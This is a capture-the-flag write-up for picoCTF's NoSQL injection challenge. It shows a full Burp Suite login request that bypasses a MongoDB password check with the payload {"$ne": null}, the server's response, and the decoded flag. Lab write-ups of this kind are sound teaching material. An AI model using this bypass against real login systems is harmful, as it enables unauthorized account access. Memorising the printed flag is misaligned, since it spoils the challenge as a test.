## No Sql Injection

Challenge description:
```
Can you try to get access to this website to get the flag?
You can download the source here.
Additional details will be available after launching your challenge instance.
```

Hints:
```
Not only SQL injection exist but also NonSQL injection exists.
Make sure you look at everything the server is sending back.
```

The provided source code link is:
```
https://artifacts.picoctf.net/c_atlas/37/app.tar.gz
```

The challenge instance launched:
```
http://atlas.picoctf.net:61076/
```

Initially the file type of the source code is checked using ```file app.tar.gz```. The output:
```
app.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 20480
```

Thus it is unzipped using:
```
tar -xvf app.tar.gz
```

The structure is :
```
admin.html  index.html  package.json  server.js
```

On going through all the files, in the ```server.js``` file, the following existing user credentials are found:
```
    // Store initial user
    const initialUser = new User({
      firstName: "pico",
      lastName: "player",
      email: "picoplayer355@picoctf.org",
      password: crypto.randomBytes(16).toString("hex").slice(0, 16),
    });
```

This email is used to login in the website page. Looking up syntax for no sql injections (since this website uses mongodb), the following is found for the password field:
```
{"$ne": null}
```

The request sent in Burpsuite is as follows:
```
POST /login HTTP/1.1
Host: atlas.picoctf.net:61076
Content-Length: 66
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://atlas.picoctf.net:61076
Referer: http://atlas.picoctf.net:61076/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"picoplayer355@picoctf.org","password":"{\"$ne\": null}"}
```


The reponse is:
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 186
ETag: W/"ba-7/pkE41Bq9cbRmeDm6aZ+wsgexM"
Date: Tue, 10 Dec 2024 08:38:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"email":"picoplayer355@picoctf.org","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uXzY3YjFhM2M4fQ==","firstName":"pico","lastName":"player"}
```

The token field is highlighted, and BurpSuite automaticall converts it into Base64, which is our flag:
```
picoCTF{jBhD2y7XoNzPv_1YxS9Ew5qL0uI6pasql_injection_67b1a3c8}
```


The following website is used for getting syntax for noSQL injection:
```
https://book.hacktricks.xyz/pentesting-web/nosql-injection
```

